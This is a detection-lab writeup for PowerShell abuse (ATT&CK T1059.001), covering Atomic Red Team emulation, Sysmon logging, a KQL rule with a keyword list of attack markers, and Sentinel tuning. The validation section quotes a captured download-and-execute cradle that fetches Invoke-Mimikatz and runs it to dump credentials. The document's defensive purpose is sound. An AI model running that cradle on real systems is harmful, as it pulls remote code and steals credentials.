# T1059.001 — Command and Scripting Interpreter: PowerShell

**Tactic:** Execution  
**ATT&CK:** [T1059.001](https://attack.mitre.org/techniques/T1059/001/)  
**Status:** ✅ Detected

## Summary

PowerShell is a heavily abused execution mechanism in real intrusions. Attackers use it for download cradles, in-memory execution, and obfuscated commands to evade detection.

This detection targets PowerShell launched with flags and patterns that are high-signal for malicious use, rather than ordinary administration.

## Emulation

Simulated with Atomic Red Team, using the assumed-breach model where tests run directly on the victim endpoint. From the Atomic Red Team install directory, in an elevated PowerShell session:

```powershell
Import-Module C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1 -Force
Invoke-AtomicTest T1059.001 -GetPrereqs
Invoke-AtomicTest T1059.001
```

Cleanup after testing to return the host to a known-good state:

```powershell
Invoke-AtomicTest T1059.001 -Cleanup
```

## Telemetry source

- **Sysmon Event ID 1** (Process Create), collected via Azure Monitor Agent into the Log Analytics `Event` table.
- Sysmon configured with the SwiftOnSecurity baseline config.

**Why Sysmon EID 1?** PowerShell abuse is visible through the process that launches it. EID 1 captures the full command line, which is what the detection needs to identify encoded commands, download cradles, and other suspicious flags. Without command-line logging, you can see that PowerShell ran, but not the details that distinguish malicious use from benign administration.

## Detection logic

Written against the Sysmon-via-AMA schema (`Event` table), where event detail lives in the `EventData` field, so the query string-matches on `EventData` rather than using a fully parsed process schema:

```kql
Event
| where Source == "Microsoft-Windows-Sysmon"
| where EventID == 1
| where EventData has "powershell"
| where EventData has_any ("-enc", "-EncodedCommand", "FromBase64String",
                           "DownloadString", "IEX", "hidden", "-nop", "-NoProfile")
| project TimeGenerated, Computer, RenderedDescription
| sort by TimeGenerated desc
```

## Sentinel analytics rule

| Setting | Value |
|---|---|
| Rule type | Scheduled query |
| Run frequency | Every 5 minutes |
| Lookback | Last 1 hour |
| Alert threshold | Results > 0 |
| Suppression | On; stop for 1 hour after an alert |
| Entity mapping | Host → HostName = `Computer` |
| Incident creation | Enabled |
| MITRE mapping | Execution / T1059.001 |

This rule was initially configured with a 5-minute lookback, which caused missed events due to ingestion latency. Updating to a 1-hour lookback with suppression enabled fixed that issue and became the standard tuning pattern for later detections. For the rationale, see the
[T1059.003 writeup](https://github.com/alexcolincrawford/mitre-attack-sentinel-detection-lab/blob/main/detections/T1059.003-windows-command-shell/writeup.md).

## Validation

The analytics rule fired and raised a live incident in the Microsoft Defender portal, correctly attributed to `CLIENT01.lab.local` and grouped into 19 related events.

Inspecting the captured event showed a download-and-execute cradle for **Mimikatz**, pulled into memory and run with `-DumpCreds`.

The captured command line was:

```text
cmd.exe /c powershell.exe "IEX (New-Object Net.WebClient).DownloadString('.../PowerShellMafia/PowerSploit/.../Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```

This validates the pipeline end to end: the attack was emulated on the endpoint, captured by Sysmon, forwarded through the AMA/DCR pipeline, matched by the KQL rule, and surfaced as an incident mapped to T1059.001.

## False-positive considerations

PowerShell is common in legitimate administration, so this rule will generate benign hits in real environments. It can be tuned by:

- Scoping to interactive user sessions rather than SYSTEM or service accounts.
- Weighting encoded commands and download cradles more heavily than flags like `-nop` or `-NoProfile`.
- Correlating with the parent process, since PowerShell spawned by `cmd.exe`, `wscript.exe`, or `mshta.exe` is usually higher signal than PowerShell launched by a known management tool.

## Detection lifecycle covered

Emulate (Atomic Red Team) → confirm telemetry (Sysmon EID 1) → detect (KQL analytics rule) → raise incident (Sentinel/Defender) → suppression to prevent duplicate incidents → false-positive analysis → document (this writeup).
